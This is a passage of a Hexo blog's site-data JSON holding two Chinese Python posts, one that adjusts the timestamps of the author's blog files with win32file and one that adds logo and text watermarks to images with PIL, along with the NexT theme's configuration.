datetime <span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"><span class=\"keyword\">from</span> win32file <span class=\"keyword\">import</span> CreateFile, SetFileTime, GetFileTime, CloseHandle</span><br><span class=\"line\"><span class=\"keyword\">from</span> win32file <span class=\"keyword\">import</span> GENERIC_READ, GENERIC_WRITE, OPEN_EXISTING</span><br><span class=\"line\"><span class=\"keyword\">from</span> pywintypes <span class=\"keyword\">import</span> Time\t<span class=\"comment\">#忽略此处报错，不影响运行</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">modifyFileTime</span>(<span class=\"params\">filePath, createTime, modifyTime, accessTime, offset</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    用来修改任意文件的相关时间属性，时间格式：YYYY-MM-DD HH:MM:SS 例如：2019-02-02 00:01:02</span></span><br><span class=\"line\"><span class=\"string\">    :param filePath: 文件路径名</span></span><br><span class=\"line\"><span class=\"string\">    :param createTime: 创建时间</span></span><br><span class=\"line\"><span class=\"string\">    :param modifyTime: 修改时间</span></span><br><span class=\"line\"><span class=\"string\">    :param accessTime: 访问时间</span></span><br><span class=\"line\"><span class=\"string\">    :param offset: 时间偏移的秒数,tuple格式，顺序和参数时间对应</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    format = <span class=\"string\">&quot;%Y-%m-%d %H:%M:%S&quot;</span>  <span class=\"comment\"># 时间格式</span></span><br><span class=\"line\">    cTime_t = timeOffsetAndStruct(createTime, format, offset[<span class=\"number\">0</span>])</span><br><span class=\"line\">    mTime_t = timeOffsetAndStruct(modifyTime, format, offset[<span class=\"number\">1</span>])</span><br><span class=\"line\">    aTime_t = timeOffsetAndStruct(accessTime, format, offset[<span class=\"number\">2</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    fh = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, <span class=\"number\">0</span>, <span class=\"literal\">None</span>, OPEN_EXISTING, <span class=\"number\">0</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    createTimes, accessTimes, modifyTimes = GetFileTime(fh)</span><br><span class=\"line\"></span><br><span class=\"line\">    createTimes = Time(time.mktime(cTime_t))</span><br><span class=\"line\">    accessTimes = Time(time.mktime(aTime_t))</span><br><span class=\"line\">    modifyTimes = Time(time.mktime(mTime_t))</span><br><span class=\"line\">    SetFileTime(fh, createTimes, accessTimes, modifyTimes)</span><br><span class=\"line\">    CloseHandle(fh)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">timeOffsetAndStruct</span>(<span class=\"params\">times, format, offset</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> time.localtime(time.mktime(time.strptime(times, format)) + offset)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">offset = (<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> root, dirs, files <span class=\"keyword\">in</span> os.walk(<span class=\"string\">&#x27;F:\\\\Blog\\\\source\\\\_posts&#x27;</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> files:</span><br><span class=\"line\">        filepath = root + <span class=\"string\">&#x27;\\\\&#x27;</span> + file</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">\t\t用来获取任意文件的相关时间属性</span></span><br><span class=\"line\"><span class=\"string\">\t\t&quot;&quot;&quot;</span></span><br><span class=\"line\">        ctime = str(datetime.fromtimestamp(os.path.getctime(filepath)))[:<span class=\"number\">19</span>]</span><br><span class=\"line\">        mtime = str(datetime.fromtimestamp(os.path.getmtime(filepath)))[:<span class=\"number\">19</span>]</span><br><span class=\"line\">        atime = str(datetime.fromtimestamp(os.path.getatime(filepath)))[:<span class=\"number\">19</span>]</span><br><span class=\"line\">        </span><br><span class=\"line\">\t\tmodifyFileTime(filepath, ctime, mtime, atime, offset)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1632,"excerpt":"","more":"<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"><span class=\"keyword\">from</span> win32file <span class=\"keyword\">import</span> CreateFile, SetFileTime, GetFileTime, CloseHandle</span><br><span class=\"line\"><span class=\"keyword\">from</span> win32file <span class=\"keyword\">import</span> GENERIC_READ, GENERIC_WRITE, OPEN_EXISTING</span><br><span class=\"line\"><span class=\"keyword\">from</span> pywintypes <span class=\"keyword\">import</span> Time\t<span class=\"comment\">#忽略此处报错，不影响运行</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">modifyFileTime</span>(<span class=\"params\">filePath, createTime, modifyTime, accessTime, offset</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    用来修改任意文件的相关时间属性，时间格式：YYYY-MM-DD HH:MM:SS 例如：2019-02-02 00:01:02</span></span><br><span class=\"line\"><span class=\"string\">    :param filePath: 文件路径名</span></span><br><span class=\"line\"><span class=\"string\">    :param createTime: 创建时间</span></span><br><span class=\"line\"><span class=\"string\">    :param modifyTime: 修改时间</span></span><br><span class=\"line\"><span class=\"string\">    :param accessTime: 访问时间</span></span><br><span class=\"line\"><span class=\"string\">    :param offset: 时间偏移的秒数,tuple格式，顺序和参数时间对应</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    format = <span class=\"string\">&quot;%Y-%m-%d %H:%M:%S&quot;</span>  <span class=\"comment\"># 时间格式</span></span><br><span class=\"line\">    cTime_t = timeOffsetAndStruct(createTime, format, offset[<span class=\"number\">0</span>])</span><br><span class=\"line\">    mTime_t = timeOffsetAndStruct(modifyTime, format, offset[<span class=\"number\">1</span>])</span><br><span class=\"line\">    aTime_t = timeOffsetAndStruct(accessTime, format, offset[<span class=\"number\">2</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    fh = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, <span class=\"number\">0</span>, <span class=\"literal\">None</span>, OPEN_EXISTING, <span class=\"number\">0</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    createTimes, accessTimes, modifyTimes = GetFileTime(fh)</span><br><span class=\"line\"></span><br><span class=\"line\">    createTimes = Time(time.mktime(cTime_t))</span><br><span class=\"line\">    accessTimes = Time(time.mktime(aTime_t))</span><br><span class=\"line\">    modifyTimes = Time(time.mktime(mTime_t))</span><br><span class=\"line\">    SetFileTime(fh, createTimes, accessTimes, modifyTimes)</span><br><span class=\"line\">    CloseHandle(fh)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">timeOffsetAndStruct</span>(<span class=\"params\">times, format, offset</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> time.localtime(time.mktime(time.strptime(times, format)) + offset)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">offset = (<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> root, dirs, files <span class=\"keyword\">in</span> os.walk(<span class=\"string\">&#x27;F:\\\\Blog\\\\source\\\\_posts&#x27;</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> files:</span><br><span class=\"line\">        filepath = root + <span class=\"string\">&#x27;\\\\&#x27;</span> + file</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">\t\t用来获取任意文件的相关时间属性</span></span><br><span class=\"line\"><span class=\"string\">\t\t&quot;&quot;&quot;</span></span><br><span class=\"line\">        ctime = str(datetime.fromtimestamp(os.path.getctime(filepath)))[:<span class=\"number\">19</span>]</span><br><span class=\"line\">        mtime = str(datetime.fromtimestamp(os.path.getmtime(filepath)))[:<span class=\"number\">19</span>]</span><br><span class=\"line\">        atime = str(datetime.fromtimestamp(os.path.getatime(filepath)))[:<span class=\"number\">19</span>]</span><br><span class=\"line\">        </span><br><span class=\"line\">\t\tmodifyFileTime(filepath, ctime, mtime, atime, offset)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n"},{"title":"Python叠加图片水印","date":"2019-03-29T09:11:09.000Z","abbrlink":"902d70b2","_content":"# 代码\n```py\nfrom PIL import Image, ImageFont, ImageDraw\nimport os\n\n\ndef fun(img, factor=1):\n    img = img.convert('RGBA')\n    img_blender = Image.new('RGBA', img.size, (0, 0, 0, 0))\n    img = Image.blend(img_blender, img, factor)\n    img = img.resize((700, 700))\n    return img\n\n\nrootdir = 'logo'\nsavedir = 'save'\nlists = os.listdir(rootdir)\nfor i in range(0, len(lists)):\n    path = os.path.join(rootdir, lists[i])\n    im = Image.open('logo.jpg')\n    im1 = Image.open(path)\n    im1 = fun(im1)\n    xy = im1.size\n    im.paste(im1, (960-xy[0]/2, 400-xy[1]/2), mask=im1)\n    draw = ImageDraw.Draw(im)\n    textsize = 24\n    font = ImageFont.truetype(\"C:\\Windows\\Fonts\\Arial.ttf\", textsize)\n    length = draw.textsize(lists[i].split('.')[0], font)\n    while True:\n        font = ImageFont.truetype(\"C:\\Windows\\Fonts\\Arial.ttf\", textsize)\n        length = draw.textsize(lists[i].split('.')[0], font)\n        if (length[0] <= 1536) and (textsize <= 96):\n            textsize += 1\n        else:\n            textsize -= 1\n            font = ImageFont.truetype(\"C:\\Windows\\Fonts\\Arial.ttf\", textsize)\n            length = draw.textsize(lists[i].split('.')[0], font)\n            break\n    draw.text((960-length[0]/2, 860-length[1]/2), lists[i].split('.')[0], (255, 255, 255), font=font)\n    im.save(os.path.join(savedir, lists[i]), 'jpeg')\n    print(i)\n```","source":"_posts/Python叠加图片水印.md","raw":"---\ntitle: Python叠加图片水印\ndate: 2019-03-29 17:11:09\ncategories:\n  - 编程语言\n  - Python\ntags:\n  - PIL\nabbrlink: 902d70b2\n---\n# 代码\n```py\nfrom PIL import Image, ImageFont, ImageDraw\nimport os\n\n\ndef fun(img, factor=1):\n    img = img.convert('RGBA')\n    img_blender = Image.new('RGBA', img.size, (0, 0, 0, 0))\n    img = Image.blend(img_blender, img, factor)\n    img = img.resize((700, 700))\n    return img\n\n\nrootdir = 'logo'\nsavedir = 'save'\nlists = os.listdir(rootdir)\nfor i in range(0, len(lists)):\n    path = os.path.join(rootdir, lists[i])\n    im = Image.open('logo.jpg')\n    im1 = Image.open(path)\n    im1 = fun(im1)\n    xy = im1.size\n    im.paste(im1, (960-xy[0]/2, 400-xy[1]/2), mask=im1)\n    draw = ImageDraw.Draw(im)\n    textsize = 24\n    font = ImageFont.truetype(\"C:\\Windows\\Fonts\\Arial.ttf\", textsize)\n    length = draw.textsize(lists[i].split('.')[0], font)\n    while True:\n        font = ImageFont.truetype(\"C:\\Windows\\Fonts\\Arial.ttf\", textsize)\n        length = draw.textsize(lists[i].split('.')[0], font)\n        if (length[0] <= 1536) and (textsize <= 96):\n            textsize += 1\n        else:\n            textsize -= 1\n            font = ImageFont.truetype(\"C:\\Windows\\Fonts\\Arial.ttf\", textsize)\n            length = draw.textsize(lists[i].split('.')[0], font)\n            break\n    draw.text((960-length[0]/2, 860-length[1]/2), lists[i].split('.')[0], (255, 255, 255), font=font)\n    im.save(os.path.join(savedir, lists[i]), 'jpeg')\n    print(i)\n```","slug":"Python叠加图片水印","published":1,"updated":"2020-05-11T09:40:02.911Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbc001wqse5e4oc0rm2","content":"<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image, ImageFont, ImageDraw</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fun</span>(<span class=\"params\">img, factor=<span class=\"number\">1</span></span>):</span></span><br><span class=\"line\">    img = img.convert(<span class=\"string\">&#x27;RGBA&#x27;</span>)</span><br><span class=\"line\">    img_blender = Image.new(<span class=\"string\">&#x27;RGBA&#x27;</span>, img.size, (<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>))</span><br><span class=\"line\">    img = Image.blend(img_blender, img, factor)</span><br><span class=\"line\">    img = img.resize((<span class=\"number\">700</span>, <span class=\"number\">700</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> img</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">rootdir = <span class=\"string\">&#x27;logo&#x27;</span></span><br><span class=\"line\">savedir = <span class=\"string\">&#x27;save&#x27;</span></span><br><span class=\"line\">lists = os.listdir(rootdir)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(lists)):</span><br><span class=\"line\">    path = os.path.join(rootdir, lists[i])</span><br><span class=\"line\">    im = Image.open(<span class=\"string\">&#x27;logo.jpg&#x27;</span>)</span><br><span class=\"line\">    im1 = Image.open(path)</span><br><span class=\"line\">    im1 = fun(im1)</span><br><span class=\"line\">    xy = im1.size</span><br><span class=\"line\">    im.paste(im1, (<span class=\"number\">960</span>-xy[<span class=\"number\">0</span>]/<span class=\"number\">2</span>, <span class=\"number\">400</span>-xy[<span class=\"number\">1</span>]/<span class=\"number\">2</span>), mask=im1)</span><br><span class=\"line\">    draw = ImageDraw.Draw(im)</span><br><span class=\"line\">    textsize = <span class=\"number\">24</span></span><br><span class=\"line\">    font = ImageFont.truetype(<span class=\"string\">&quot;C:\\Windows\\Fonts\\Arial.ttf&quot;</span>, textsize)</span><br><span class=\"line\">    length = draw.textsize(lists[i].split(<span class=\"string\">&#x27;.&#x27;</span>)[<span class=\"number\">0</span>], font)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        font = ImageFont.truetype(<span class=\"string\">&quot;C:\\Windows\\Fonts\\Arial.ttf&quot;</span>, textsize)</span><br><span class=\"line\">        length = draw.textsize(lists[i].split(<span class=\"string\">&#x27;.&#x27;</span>)[<span class=\"number\">0</span>], font)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (length[<span class=\"number\">0</span>] &lt;= <span class=\"number\">1536</span>) <span class=\"keyword\">and</span> (textsize &lt;= <span class=\"number\">96</span>):</span><br><span class=\"line\">            textsize += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            textsize -= <span class=\"number\">1</span></span><br><span class=\"line\">            font = ImageFont.truetype(<span class=\"string\">&quot;C:\\Windows\\Fonts\\Arial.ttf&quot;</span>, textsize)</span><br><span class=\"line\">            length = draw.textsize(lists[i].split(<span class=\"string\">&#x27;.&#x27;</span>)[<span class=\"number\">0</span>], font)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    draw.text((<span class=\"number\">960</span>-length[<span class=\"number\">0</span>]/<span class=\"number\">2</span>, <span class=\"number\">860</span>-length[<span class=\"number\">1</span>]/<span class=\"number\">2</span>), lists[i].split(<span class=\"string\">&#x27;.&#x27;</span>)[<span class=\"number\">0</span>], (<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>), font=font)</span><br><span class=\"line\">    im.save(os.path.join(savedir, lists[i]), <span class=\"string\">&#x27;jpeg&#x27;</span>)</span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","b